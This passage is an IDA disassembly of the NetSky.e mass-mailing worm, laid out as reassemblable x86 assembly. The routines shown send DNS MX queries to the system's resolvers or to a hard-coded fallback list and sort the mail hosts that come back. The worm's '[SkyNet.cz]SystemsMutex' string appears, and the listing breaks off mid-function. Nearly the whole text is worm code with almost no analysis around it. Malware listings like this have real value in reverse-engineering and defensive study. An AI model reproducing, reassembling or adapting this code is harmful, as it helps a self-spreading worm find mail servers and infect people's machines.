; [00000012 BYTES. COLLAPSED STRUCT _cpinfo. PRESS KEYPAD "+" TO EXPAND]
; [00000044 BYTES. COLLAPSED STRUCT _STARTUPINFOA. PRESS KEYPAD	"+" TO EXPAND]
; [00000190 BYTES. COLLAPSED STRUCT WSAData. PRESS KEYPAD "+" TO EXPAND]
; [00000008 BYTES. COLLAPSED STRUCT FILETIME. PRESS KEYPAD "+" TO EXPAND]
; [0000013E BYTES. COLLAPSED STRUCT _WIN32_FIND_DATAA. PRESS KEYPAD "+"	TO EXPAND]
; [00000010 BYTES. COLLAPSED STRUCT SYSTEMTIME.	PRESS KEYPAD "+" TO EXPAND]
; [000000AC BYTES. COLLAPSED STRUCT _TIME_ZONE_INFORMATION. PRESS KEYPAD "+" TO	EXPAND]
; [00000010 BYTES. COLLAPSED STRUCT _SYSTEMTIME. PRESS KEYPAD "+" TO EXPAND]
; [00000004 BYTES. COLLAPSED STRUCT in_addr::$D372A6A693AD58C7DF6E24FECE06681F::$033CE9DED08D2165C0975678BDBAA031. PRESS KEYPAD	"+" TO EXPAND]
; [00000004 BYTES. COLLAPSED STRUCT in_addr::$D372A6A693AD58C7DF6E24FECE06681F::$B5B88EE2C732E3825D6862D85B1080CF. PRESS KEYPAD	"+" TO EXPAND]
; [00000004 BYTES. COLLAPSED STRUCT in_addr::$D372A6A693AD58C7DF6E24FECE06681F.	PRESS KEYPAD "+" TO EXPAND]
; [00000004 BYTES. COLLAPSED STRUCT in_addr. PRESS KEYPAD "+" TO EXPAND]
; [00000010 BYTES. COLLAPSED STRUCT sockaddr. PRESS KEYPAD "+" TO EXPAND]

;
; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º	This file is generated by The Interactive Disassembler (IDA)	    º
; º	Copyright (c) 2004 by DataRescue sa/nv,	<ida@datarescue.com>	    º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
;
; File Name   :	NetSky.e
; Format      :	Portable executable for	IBM PC (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 00005000 (  20480.)
; Section size in file		: 00004E00 (  19968.)
; Offset to raw	data for section: 00000400
; Flags	E0000060: Text Data Executable Readable	Writable
; Alignment	: 16 bytes ?
; OS type	  :  MS	Windows
; Application type:  Executable	32bit
;


unicode		macro page,string,zero
		irpc c,<string>
		db '&c', page
		endm
		ifnb <zero>
		dw zero
		endif
endm

		model flat

; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure code
; Segment permissions: Read/Write/Execute
A		segment	para public 'CODE' use32
		assume cs:A
		;org 401000h
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401000	proc near		; CODE XREF: sub_4010A4+FAp

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_4]
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		xor	edx, edx
		xor	ecx, ecx
		xor	esi, esi
		cmp	byte ptr [edi],	0
		jz	short loc_40103F
		push	ebx
		push	1
		pop	ebx
		sub	ebx, edi
		mov	[ebp+arg_0], ebx

loc_40101F:				; CODE XREF: sub_401000+3Cj
		mov	bl, [edi]
		cmp	bl, 2Eh
		jnz	short loc_401032
		mov	[edx+eax], cl
		mov	edx, [ebp+arg_0]
		xor	ecx, ecx
		add	edx, edi
		jmp	short loc_401037
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401032:				; CODE XREF: sub_401000+24j
		mov	[esi+eax+1], bl
		inc	ecx

loc_401037:				; CODE XREF: sub_401000+30j
		inc	esi
		inc	edi
		cmp	byte ptr [edi],	0
		jnz	short loc_40101F
		pop	ebx

loc_40103F:				; CODE XREF: sub_401000+14j
		mov	[edx+eax], cl
		and	byte ptr [esi+eax+1], 0
		lea	eax, [esi+1]
		pop	edi
		pop	esi
		pop	ebp
		retn
sub_401000	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_40104E	proc near		; CODE XREF: sub_401335+163p
					; sub_401335+1C0p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_4]
		push	ebx
		push	esi
		push	edi
		mov	edi, [esp+0Ch+arg_0]

loc_401059:				; CODE XREF: sub_40104E+4Dj
		xor	edx, edx

loc_40105B:				; CODE XREF: sub_40104E+43j
		cmp	edx, 800h
		jge	short loc_40109D
		movzx	ecx, byte ptr [eax]
		test	ecx, ecx
		jz	short loc_40109D
		test	cl, 0C0h
		jnz	short loc_401093
		push	1
		pop	esi
		cmp	ecx, esi
		jl	short loc_401081

loc_401076:				; CODE XREF: sub_40104E+31j
		mov	bl, [esi+eax]
		mov	[edi], bl
		inc	edi
		inc	esi
		cmp	esi, ecx
		jle	short loc_401076

loc_401081:				; CODE XREF: sub_40104E+26j
		cmp	byte ptr [ecx+eax+1], 0
		lea	eax, [ecx+eax+1]
		jz	short loc_401090
		mov	byte ptr [edi],	2Eh
		inc	edi

loc_401090:				; CODE XREF: sub_40104E+3Cj
		inc	edx
		jmp	short loc_40105B
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401093:				; CODE XREF: sub_40104E+1Fj
		movzx	eax, byte ptr [eax+1]
		add	eax, [esp+0Ch+arg_8]
		jmp	short loc_401059
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40109D:				; CODE XREF: sub_40104E+13j
					; sub_40104E+1Aj
		and	byte ptr [edi],	0
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_40104E	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4010A4	proc near		; CODE XREF: sub_40156C+7Cp
					; sub_40156C+A6p ...

buf		= byte ptr -818h
var_814		= word ptr -814h
var_812		= word ptr -812h
var_810		= word ptr -810h
var_80E		= word ptr -80Eh
var_80C		= dword	ptr -80Ch
fromlen		= dword	ptr -18h
from		= sockaddr ptr -14h
optval		= byte ptr -4
arg_0		= dword	ptr  8
name		= dword	ptr  0Ch
s		= dword	ptr  10h
hostshort	= word ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 818h
		and	[ebp+buf], 0
		push	esi
		push	edi
		mov	ecx, 1FFh
		xor	eax, eax
		lea	edi, [ebp-817h]
		rep stosd
		stosw
		push	10h
		xor	esi, esi
		pop	edx
		stosb
		push	edx		; size_t
		lea	eax, [ebp+from]
		push	esi		; int
		push	eax		; void *
		mov	[ebp+fromlen], edx
		call	_memset
		mov	edi, ds:htons
		add	esp, 0Ch
		cmp	word ptr [ebp+s], si
		mov	[ebp+from.sa_family], 2
		jbe	short loc_4010F5
		push	[ebp+s]
		jmp	short loc_401111
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4010F5:				; CODE XREF: sub_4010A4+4Aj
		push	offset proto	; proto
		push	offset name	; name
		call	ds:getservbyname
		cmp	eax, esi
		jz	short loc_40110F
		mov	ax, [eax+8]
		jmp	short loc_401113
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40110F:				; CODE XREF: sub_4010A4+63j
		push	35h		; hostshort

loc_401111:				; CODE XREF: sub_4010A4+4Fj
		call	edi ; htons

loc_401113:				; CODE XREF: sub_4010A4+69j
		push	[ebp+name]	; cp
		mov	word ptr [ebp+from.sa_data], ax
		call	ds:inet_addr
		cmp	eax, 0FFFFFFFFh
		mov	dword ptr [ebp+from.sa_data+2],	eax
		jnz	short loc_40113F
		push	[ebp+name]	; name
		call	ds:gethostbyname
		cmp	eax, esi
		jz	short loc_40115A
		mov	eax, [eax+0Ch]
		mov	eax, [eax]
		mov	eax, [eax]
		mov	dword ptr [ebp+from.sa_data+2],	eax

loc_40113F:				; CODE XREF: sub_4010A4+82j
		push	esi		; protocol
		push	2		; type
		push	2		; af
		call	ds:socket
		cmp	eax, 0FFFFFFFFh
		mov	[ebp+s], eax
		jnz	short loc_40115E
		push	0FFFFFFFDh

loc_401154:				; CODE XREF: sub_4010A4+B8j
		pop	eax
		jmp	loc_401264
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40115A:				; CODE XREF: sub_4010A4+8Fj
		push	0FFFFFFFEh
		jmp	short loc_401154
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40115E:				; CODE XREF: sub_4010A4+ACj
		push	ebx
		push	11DFh		; hostshort
		call	edi ; htons
		or	byte ptr [ebp-816h], 1
		push	1		; hostshort
		mov	word ptr [ebp+buf], ax
		call	edi ; htons
		mov	[ebp+var_814], ax
		lea	eax, [ebp+var_80C]
		push	eax
		mov	[ebp+var_812], si
		push	[ebp+arg_0]
		mov	[ebp+var_810], si
		mov	[ebp+var_80E], si
		call	sub_401000
		pop	ecx
		mov	esi, eax
		pop	ecx
		add	esi, 0Ch
		push	dword ptr [ebp+hostshort] ; hostshort
		and	[ebp+esi+buf], 0
		inc	esi
		call	edi ; htons
		push	1		; hostshort
		mov	word ptr [ebp+esi+buf],	ax
		call	edi ; htons
		mov	[ebp+esi-816h],	ax
		mov	edi, ds:setsockopt
		lea	eax, [ebp+optval]
		push	4		; optlen
		push	eax		; optval
		mov	ebx, 0FFFFh
		push	1006h		; optname
		push	ebx		; level
		push	[ebp+s]		; s
		mov	dword ptr [ebp+optval],	0FA0h
		call	edi ; setsockopt
		lea	eax, [ebp+optval]
		push	4		; optlen
		push	eax		; optval
		push	1005h		; optname
		push	ebx		; level
		mov	ebx, [ebp+s]
		push	ebx		; s
		call	edi ; setsockopt
		lea	eax, [ebp+from]
		push	10h		; tolen
		push	eax		; to
		add	esi, 5
		push	0		; flags
		lea	eax, [ebp+buf]
		push	esi		; len
		push	eax		; buf
		push	ebx		; s
		call	ds:sendto
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_401225
		push	0FFFFFFFCh

loc_401222:				; CODE XREF: sub_4010A4+1AEj
		pop	esi
		jmp	short loc_40125A
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401225:				; CODE XREF: sub_4010A4+17Aj
		lea	eax, [ebp+fromlen]
		push	eax		; fromlen
		lea	eax, [ebp+from]
		push	eax		; from
		push	0		; flags
		push	800h		; len
		push	[ebp+arg_10]	; buf
		push	ebx		; s
		call	ds:recvfrom
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_401258
		call	ds:WSAGetLastError
		cmp	eax, 274Ch
		jz	short loc_401254
		push	0FFFFFFFBh
		jmp	short loc_401222
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401254:				; CODE XREF: sub_4010A4+1AAj
		xor	esi, esi
		jmp	short loc_40125A
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401258:				; CODE XREF: sub_4010A4+19Dj
		mov	esi, eax

loc_40125A:				; CODE XREF: sub_4010A4+17Fj
					; sub_4010A4+1B2j
		push	ebx		; s
		call	ds:closesocket
		mov	eax, esi
		pop	ebx

loc_401264:				; CODE XREF: sub_4010A4+B1j
		pop	edi
		pop	esi
		leave
		retn
sub_4010A4	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_401268	proc near		; CODE XREF: sub_401335+105p

arg_0		= dword	ptr  8

		push	esi
		mov	esi, [esp+arg_0]
		mov	eax, esi
		push	edi
		imul	eax, 41010h
		push	eax
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	edi, eax
		pop	ecx
		test	edi, edi
		jz	short loc_4012AA
		mov	eax, esi
		imul	eax, 204h
		push	eax		; size_t
		push	0		; int
		push	edi		; void *
		call	_memset
		add	esp, 0Ch
		test	esi, esi
		jle	short loc_4012AA
		mov	eax, edi
		mov	ecx, esi

loc_40129F:				; CODE XREF: sub_401268+40j
		mov	[eax], si
		add	eax, 204h
		dec	ecx
		jnz	short loc_40129F

loc_4012AA:				; CODE XREF: sub_401268+19j
					; sub_401268+31j
		mov	eax, edi
		pop	edi
		pop	esi
		retn
sub_401268	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4012AF	proc near		; CODE XREF: sub_401335+229p

var_20C		= dword	ptr -20Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 20Ch
		mov	eax, [ebp+arg_0]
		push	ebx
		push	esi
		push	edi
		movzx	eax, word ptr [eax]
		cmp	eax, 2
		jl	short loc_401330
		lea	ecx, [eax-1]
		mov	esi, 204h
		mov	[ebp+var_8], ecx
		jmp	short loc_4012D6
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4012D3:				; CODE XREF: sub_4012AF+7Fj
		mov	ecx, [ebp+var_8]

loc_4012D6:				; CODE XREF: sub_4012AF+22j
		push	1
		test	ecx, ecx
		pop	eax
		jle	short loc_401330
		mov	edx, [ebp+arg_0]
		mov	[ebp+var_4], ecx
		lea	edi, [edx+204h]

loc_4012E9:				; CODE XREF: sub_4012AF+7Bj
		mov	cx, [edi-202h]
		cmp	cx, [edi+2]
		jbe	short loc_401325
		lea	ebx, [edi-204h]
		push	esi
		lea	eax, [ebp+var_20C]
		push	ebx
		push	eax
		call	_memcpy
		push	esi
		push	edi
		push	ebx
		call	_memcpy
		lea	eax, [ebp+var_20C]
		push	esi
		push	eax
		push	edi
		call	_memcpy
		add	esp, 24h
		xor	eax, eax

loc_401325:				; CODE XREF: sub_4012AF+45j
		add	edi, esi
		dec	[ebp+var_4]
		jnz	short loc_4012E9
		test	eax, eax
		jz	short loc_4012D3

loc_401330:				; CODE XREF: sub_4012AF+15j
					; sub_4012AF+2Cj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4012AF	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401335	proc near		; CODE XREF: sub_40156C+119p

var_218		= byte ptr -218h
var_119		= byte ptr -119h
var_118		= byte ptr -118h
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
in		= in_addr ptr -10h
var_C		= dword	ptr -0Ch
hostshort	= word ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 218h
		and	[ebp+var_118], 0
		push	ebx
		push	esi
		push	edi
		push	3Fh
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp-117h]
		rep stosd
		mov	esi, [ebp+arg_0]
		mov	ebx, ds:ntohs
		stosw
		and	[ebp+var_4], 0
		stosb
		mov	ax, [esi+6]
		push	eax		; netshort
		call	ebx ; ntohs
		movzx	eax, ax
		mov	dword ptr [ebp+hostshort], eax
		mov	ax, [esi+8]
		push	eax		; netshort
		call	ebx ; ntohs
		movzx	edi, ax
		mov	ax, [esi+0Ah]
		push	eax		; netshort
		call	ebx ; ntohs
		movzx	eax, ax
		add	eax, edi
		lea	edi, [ebp+var_118]
		add	eax, dword ptr [ebp+hostshort]
		and	[ebp+var_C], 0
		mov	[ebp+var_18], edi
		mov	[ebp+var_14], eax
		lea	eax, [esi+0Ch]

loc_40139E:				; CODE XREF: sub_401335+78j
					; sub_401335+A7j
		mov	cl, [eax]
		test	cl, cl
		jz	short loc_4013DE
		movsx	ecx, cl
		inc	eax
		mov	dword ptr [ebp+in.S_un], ecx
		test	ecx, ecx
		jz	short loc_40139E
		mov	edx, ecx
		mov	esi, eax
		shr	ecx, 2
		rep movsd
		mov	ecx, edx
		and	ecx, 3
		rep movsb
		mov	edi, [ebp+var_18]
		mov	ecx, edx
		add	[ebp+var_C], ecx
		add	edi, ecx
		mov	esi, [ebp+arg_0]
		add	eax, ecx
		mov	byte ptr [edi],	2Eh
		and	byte ptr [edi+1], 0
		inc	edi
		inc	[ebp+var_C]
		mov	[ebp+var_18], edi
		jmp	short loc_40139E
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4013DE:				; CODE XREF: sub_401335+6Dj
		lea	eax, [ebp+var_118]
		push	eax		; char *
		call	_strlen
		test	eax, eax
		pop	ecx
		jz	short loc_401404
		lea	eax, [ebp+var_118]
		push	eax		; char *
		call	_strlen
		and	[ebp+eax+var_119], 0
		pop	ecx

loc_401404:				; CODE XREF: sub_401335+B8j
		mov	eax, [ebp+var_C]
		lea	edi, [eax+esi+13h]
		mov	ax, [eax+esi+13h]
		push	eax		; netshort
		call	ebx ; ntohs
		cmp	ax, 5
		jnz	short loc_40142B
		dec	dword ptr [ebp+hostshort]
		jz	short loc_40142B
		push	dword ptr [ebp+hostshort] ; hostshort
		call	ds:htons
		mov	[esi+6], ax

loc_40142B:				; CODE XREF: sub_401335+E2j
					; sub_401335+E7j
		mov	ax, [esi+6]
		push	eax		; netshort
		call	ebx ; ntohs
		test	ax, ax
		jz	short loc_401447
		push	dword ptr [ebp+hostshort]
		call	sub_401268
		test	eax, eax
		pop	ecx
		mov	[ebp+arg_0], eax
		jnz	short loc_40144E

loc_401447:				; CODE XREF: sub_401335+100j
		xor	eax, eax
		jmp	loc_401567
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40144E:				; CODE XREF: sub_401335+110j
		cmp	[ebp+var_14], 0
		jz	loc_40155B

loc_401458:				; CODE XREF: sub_401335+21Dj
		and	[ebp+var_218], 0
		mov	ax, [edi]
		push	eax		; netshort
		call	ebx ; ntohs
		movzx	eax, ax
		dec	eax
		jz	loc_4014FF
		dec	eax
		jz	loc_40153C
		sub	eax, 3
		jz	short loc_4014E9
		sub	eax, 0Ah
		jz	short loc_40148C
		mov	[ebp+var_14], 1
		jmp	loc_40153C
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40148C:				; CODE XREF: sub_401335+149j
		lea	eax, [edi+0Ch]
		push	esi
		push	eax
		lea	eax, [ebp+var_218]
		push	eax
		call	sub_40104E
		add	esp, 0Ch
		cmp	dword ptr [ebp+hostshort], 0
		jz	loc_40153C
		mov	eax, [ebp+var_4]
		mov	ecx, [ebp+arg_0]
		imul	eax, 204h
		add	eax, ecx
		lea	ecx, [ebp+var_218]
		mov	dword ptr [ebp+in.S_un], eax
		add	eax, 4
		push	ecx		; char *
		push	eax		; char *
		call	_strcpy
		mov	ax, [edi+0Ah]
		pop	ecx
		pop	ecx
		push	eax		; netshort
		call	ebx ; ntohs
		mov	ecx, dword ptr [ebp+in.S_un]
		inc	[ebp+var_4]
		dec	dword ptr [ebp+hostshort]
		mov	[ecx+2], ax
		jnz	short loc_40153C
		and	[ebp+var_4], 0
		jmp	short loc_40153C
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4014E9:				; CODE XREF: sub_401335+144j
		lea	eax, [edi+0Ah]
		push	esi
		push	eax
		lea	eax, [ebp+var_118]
		push	eax
		call	sub_40104E
		add	esp, 0Ch
		jmp	short loc_40153C
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4014FF:				; CODE XREF: sub_401335+134j
		mov	eax, [edi+0Ah]
		mov	dword ptr [ebp+in.S_un], eax
		mov	ax, [esi+6]
		push	eax		; netshort
		call	ebx ; ntohs
		movzx	eax, ax
		cmp	[ebp+var_4], eax
		jge	short loc_40153C
		push	dword ptr [ebp+in.S_un]	; in
		call	ds:inet_ntoa
		push	eax		; char *
		mov	eax, [ebp+var_4]
		imul	eax, 204h
		mov	ecx, [ebp+arg_0]
		lea	eax, [eax+ecx+104h]
		push	eax		; char *
		call	_strcpy
		inc	[ebp+var_4]
		pop	ecx
		pop	ecx

loc_40153C:				; CODE XREF: sub_401335+13Bj
					; sub_401335+152j ...
		dec	[ebp+var_14]
		jz	short loc_40155B
		mov	ax, [edi+8]
		push	eax		; netshort
		call	ebx ; ntohs
		movzx	eax, ax
		lea	edi, [eax+edi+0Ch]

loc_40154F:				; CODE XREF: sub_401335+224j
		cmp	byte ptr [edi],	0
		jz	loc_401458
		inc	edi
		jmp	short loc_40154F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40155B:				; CODE XREF: sub_401335+11Dj
					; sub_401335+20Aj
		push	[ebp+arg_0]
		call	sub_4012AF
		mov	eax, [ebp+arg_0]
		pop	ecx

loc_401567:				; CODE XREF: sub_401335+114j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_401335	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_40156C	proc near		; CODE XREF: sub_401E62+5Fp

var_808		= dword	ptr -808h
dwBytes		= dword	ptr -8
var_4		= dword	ptr -4
hMem		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 808h
		and	byte ptr [ebp+var_808],	0
		push	ebx
		push	esi
		push	edi
		mov	ecx, 1FFh
		xor	eax, eax
		lea	edi, [ebp+var_808+1]
		mov	esi, 248h
		rep stosd
		stosw
		stosb
		mov	edi, ds:GlobalAlloc
		push	esi		; dwBytes
		push	40h		; uFlags
		call	edi ; GlobalAlloc
		mov	ebx, eax
		lea	eax, [ebp+dwBytes]
		push	eax
		push	ebx
		mov	[ebp+dwBytes], esi
		call	GetNetworkParams
		cmp	eax, 6Fh
		jnz	short loc_4015C5
		push	ebx		; hMem
		call	ds:GlobalFree
		push	[ebp+dwBytes]	; dwBytes
		push	40h		; uFlags
		call	edi ; GlobalAlloc
		mov	ebx, eax

loc_4015C5:				; CODE XREF: sub_40156C+47j
		lea	eax, [ebp+dwBytes]
		push	eax
		push	ebx
		call	GetNetworkParams
		test	eax, eax
		jnz	short loc_401624
		lea	eax, [ebp+var_808]
		push	eax
		push	0Fh
		lea	eax, [ebx+110h]
		push	35h
		push	eax
		push	[ebp+hMem]
		call	sub_4010A4
		mov	edi, eax
		add	esp, 14h
		test	edi, edi
		jnz	short loc_40165E
		mov	esi, [ebx+10Ch]

loc_4015FC:				; CODE XREF: sub_40156C+B6j
		test	esi, esi
		jz	short loc_401627
		lea	eax, [ebp+var_808]
		push	eax
		push	0Fh
		lea	eax, [esi+4]
		push	35h
		push	eax
		push	[ebp+hMem]
		call	sub_4010A4
		mov	edi, eax
		add	esp, 14h
		test	edi, edi
		jnz	short loc_401661
		mov	esi, [esi]
		jmp	short loc_4015FC
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401624:				; CODE XREF: sub_40156C+65j
		mov	esi, [ebp+hMem]

loc_401627:				; CODE XREF: sub_40156C+92j
		mov	[ebp+var_4], offset off_408030

loc_40162E:				; CODE XREF: sub_40156C+EEj
		lea	eax, [ebp+var_808]
		push	eax
		mov	eax, [ebp+var_4]
		push	0Fh
		push	35h
		push	dword ptr [eax]
		push	[ebp+hMem]
		call	sub_4010A4
		mov	edi, eax
		add	esp, 14h
		test	edi, edi
		jnz	short loc_401661
		add	[ebp+var_4], 4
		cmp	[ebp+var_4], offset aSkynet_czSyste ; "[SkyNet.cz]SystemsMutex"
		jl	short loc_40162E
		jmp	short loc_401661
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40165E:				; CODE XREF: sub_40156C+88j
		mov	esi, [ebp+hMem]

